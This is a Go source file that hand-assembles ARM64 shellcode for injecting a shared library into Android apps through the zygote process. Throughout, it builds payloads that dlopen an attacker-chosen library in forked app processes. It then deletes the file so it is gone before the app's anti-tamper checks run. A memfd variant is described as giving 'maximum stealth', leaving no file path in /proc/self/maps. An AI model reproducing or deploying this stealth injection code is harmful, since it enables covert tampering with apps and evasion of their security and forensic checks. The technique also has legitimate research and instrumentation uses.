package main

import (
	"encoding/binary"
	"fmt"
)

// Helper to encode ADR xd, label
func encodeAdr(rd int, pc int, target int) uint32 {
	imm := target - pc
	immLo := uint32(imm & 3)
	immHi := uint32((imm >> 2) & 0x7ffff)
	return 0x10000000 | (immLo << 29) | (immHi << 5) | uint32(rd)
}

// Helper to encode LDR xd, label
func encodeLdr(rd int, pc int, target int) uint32 {
	imm := uint32((target - pc) >> 2)
	return 0x58000000 | (imm << 5) | uint32(rd)
}

// encodeMov encodes MOV Xd, #imm16 (MOVZ)
func encodeMov(rd int, imm16 uint16) uint32 {
	return 0xd2800000 | (uint32(imm16) << 5) | uint32(rd)
}

// encodeMovk encodes MOVK Xd, #imm16, LSL #shift (shift must be 0,16,32,48)
func encodeMovk(rd int, imm16 uint16, shift int) uint32 {
	hw := uint32(shift / 16)
	return 0xf2800000 | (hw << 21) | (uint32(imm16) << 5) | uint32(rd)
}

// BuildAgnosticShellcode constructs the in-place injection payload.
// It handles PID validation, forks the control flow, loads the library via dlopen,
// drops the handle in the mailbox, and returns.
//
// Stealth sequence (order matters):
//  1. dlopen the payload (linker opens and maps the file)
//  2. unlink the file from disk (file disappears, but pages remain mapped)
//  3. write handle to mailbox
//  4. return
//
// The file is gone from disk before the app's anti-tamper code runs in onCreate.
func BuildAgnosticShellcode(zygotePid int, setArgV0Addr uint64, dlopenAddr uint64, mailboxAddr uint64, libPath string, origBackup []byte) []byte {
	trap := make([]byte, 512)

	// [0x00] PID Check — skip to parent path if we're zygote
	binary.LittleEndian.PutUint32(trap[0x00:], 0xd2801588)                               // mov x8, #172 (getpid)
	binary.LittleEndian.PutUint32(trap[0x04:], 0xd4000001)                               // svc #0
	binary.LittleEndian.PutUint32(trap[0x08:], 0x52800001|(uint32(zygotePid&0xffff)<<5)) // mov w1, zygotePid[15:0]
	binary.LittleEndian.PutUint32(trap[0x0c:], 0x6b01001f)                               // cmp w0, w1
	binary.LittleEndian.PutUint32(trap[0x10:], 0x540004a0)                               // b.eq +0x94 → parent at 0xa4

	// [0x14] Child Path — dlopen first, then unlink
	// Save caller state
	binary.LittleEndian.PutUint32(trap[0x14:], 0xd10103ff) // sub sp, sp, #64
	binary.LittleEndian.PutUint32(trap[0x18:], 0xa90007e0) // stp x0, x1, [sp, #0]
	binary.LittleEndian.PutUint32(trap[0x1c:], 0xa9010fe2) // stp x2, x3, [sp, #16]
	binary.LittleEndian.PutUint32(trap[0x20:], 0xf90013fe) // str x30, [sp, #32]

	// dlopen(libPath, RTLD_NOW)
	binary.LittleEndian.PutUint32(trap[0x24:], encodeAdr(0, 0x24, 0x150)) // adr x0, libPath
	binary.LittleEndian.PutUint32(trap[0x28:], 0xd2800041)                // mov x1, #2 (RTLD_NOW)
	binary.LittleEndian.PutUint32(trap[0x2c:], encodeLdr(8, 0x2c, 0x110)) // ldr x8, dlopenAddr
	binary.LittleEndian.PutUint32(trap[0x30:], 0xd63f0100)                // blr x8
	// x0 = dlopen handle (or NULL on failure)
	binary.LittleEndian.PutUint32(trap[0x34:], 0xaa0003e9) // mov x9, x0 (save handle)

	// unlinkat(AT_FDCWD, libPath, 0) — remove file from disk
	binary.LittleEndian.PutUint32(trap[0x38:], 0x92800c60)                // movn x0, #0x63 → AT_FDCWD
	binary.LittleEndian.PutUint32(trap[0x3c:], encodeAdr(1, 0x3c, 0x150)) // adr x1, libPath
	binary.LittleEndian.PutUint32(trap[0x40:], 0xd2800002)                // mov x2, #0 (flags=0)
	binary.LittleEndian.PutUint32(trap[0x44:], 0xd2800468)                // mov x8, #35 (SYS_unlinkat)
	binary.LittleEndian.PutUint32(trap[0x48:], 0xd4000001)                // svc #0

	// Write handle to mailbox
	binary.LittleEndian.PutUint32(trap[0x4c:], encodeLdr(1, 0x4c, 0x120)) // ldr x1, mailboxAddr
	binary.LittleEndian.PutUint32(trap[0x50:], 0xf9000029)                // str x9, [x1]

	// Restore and return
	binary.LittleEndian.PutUint32(trap[0x54:], 0xa94007e0) // ldp x0, x1, [sp, #0]
	binary.LittleEndian.PutUint32(trap[0x58:], 0xa9410fe2) // ldp x2, x3, [sp, #16]
	binary.LittleEndian.PutUint32(trap[0x5c:], 0xf94013fe) // ldr x30, [sp, #32]
	binary.LittleEndian.PutUint32(trap[0x60:], 0x910103ff) // add sp, sp, #64
	binary.LittleEndian.PutUint32(trap[0x64:], 0xd65f03c0) // ret

	// [0xa4] Parent Path Code
	copy(trap[0xa4:0xc4], origBackup[:32])
	binary.LittleEndian.PutUint32(trap[0xc4:], encodeLdr(8, 0xc4, 0x100)) // ldr x8, returnTarget
	binary.LittleEndian.PutUint32(trap[0xc8:], 0xd61f0100)                // br x8

	// [0x100] Data Slots
	binary.LittleEndian.PutUint64(trap[0x100:], setArgV0Addr+32) // return target
	binary.LittleEndian.PutUint64(trap[0x110:], dlopenAddr)      // dlopen address
	binary.LittleEndian.PutUint64(trap[0x120:], mailboxAddr)     // mailbox address
	// [0x150] lib path string (null-terminated)
	copy(trap[0x150:], libPath)

	return trap
}

// BuildMemfdShellcode constructs a shellcode variant that uses memfd_create for
// maximum stealth. The payload is loaded from an anonymous memory-backed fd,
// leaving NO file path in /proc/self/maps.
func BuildMemfdShellcode(zygotePid int, setArgV0Addr uint64, dlopenAddr uint64, mailboxAddr uint64, memfd int, origBackup []byte) []byte {
	trap := make([]byte, 512)

	// Build /proc/self/fd/<N> string
	fdPath := fmt.Sprintf("/proc/self/fd/%d", memfd)

	// [0x00] PID Check
	binary.LittleEndian.PutUint32(trap[0x00:], 0xd2801588)                               // mov x8, #172 (getpid)
	binary.LittleEndian.PutUint32(trap[0x04:], 0xd4000001)                               // svc #0
	binary.LittleEndian.PutUint32(trap[0x08:], 0x52800001|(uint32(zygotePid&0xffff)<<5)) // mov w1, zygotePid[15:0]
	binary.LittleEndian.PutUint32(trap[0x0c:], 0x6b01001f)                               // cmp w0, w1
	binary.LittleEndian.PutUint32(trap[0x10:], 0x54000280)                               // b.eq +0x50 → parent at 0x60

	// [0x14] Child Path — dlopen("/proc/self/fd/N", RTLD_NOW)
	binary.LittleEndian.PutUint32(trap[0x14:], 0xd10103ff)                // sub sp, sp, #64
	binary.LittleEndian.PutUint32(trap[0x18:], 0xa90007e0)                // stp x0, x1, [sp, #0]
	binary.LittleEndian.PutUint32(trap[0x1c:], 0xa9010fe2)                // stp x2, x3, [sp, #16]
	binary.LittleEndian.PutUint32(trap[0x20:], 0xf90013fe)                // str x30, [sp, #32]
	binary.LittleEndian.PutUint32(trap[0x24:], encodeAdr(0, 0x24, 0x150)) // adr x0, fdPath
	binary.LittleEndian.PutUint32(trap[0x28:], 0xd2800041)                // mov x1, #2 (RTLD_NOW)
	binary.LittleEndian.PutUint32(trap[0x2c:], encodeLdr(8, 0x2c, 0x110)) // ldr x8, dlopenAddr
	binary.LittleEndian.PutUint32(trap[0x30:], 0xd63f0100)                // blr x8

	// Write handle to mailbox
	binary.LittleEndian.PutUint32(trap[0x34:], encodeLdr(1, 0x34, 0x120)) // ldr x1, mailboxAddr
	binary.LittleEndian.PutUint32(trap[0x38:], 0xf9000020)                // str x0, [x1]

	// Restore and return
	binary.LittleEndian.PutUint32(trap[0x3c:], 0xa94007e0) // ldp x0, x1, [sp, #0]
	binary.LittleEndian.PutUint32(trap[0x40:], 0xa9410fe2) // ldp x2, x3, [sp, #16]
	binary.LittleEndian.PutUint32(trap[0x44:], 0xf94013fe) // ldr x30, [sp, #32]
	binary.LittleEndian.PutUint32(trap[0x48:], 0x910103ff) // add sp, sp, #64
	binary.LittleEndian.PutUint32(trap[0x4c:], 0xd65f03c0) // ret

	// [0x60] Parent Path
	copy(trap[0x60:0x80], origBackup[:32])
	binary.LittleEndian.PutUint32(trap[0x80:], encodeLdr(8, 0x80, 0x100)) // ldr x8, returnTarget
	binary.LittleEndian.PutUint32(trap[0x84:], 0xd61f0100)                // br x8

	// [0x100] Data Slots
	binary.LittleEndian.PutUint64(trap[0x100:], setArgV0Addr+32)
	binary.LittleEndian.PutUint64(trap[0x110:], dlopenAddr)
	binary.LittleEndian.PutUint64(trap[0x120:], mailboxAddr)
	// [0x150] fd path string
	copy(trap[0x150:], fdPath)

	return trap
}
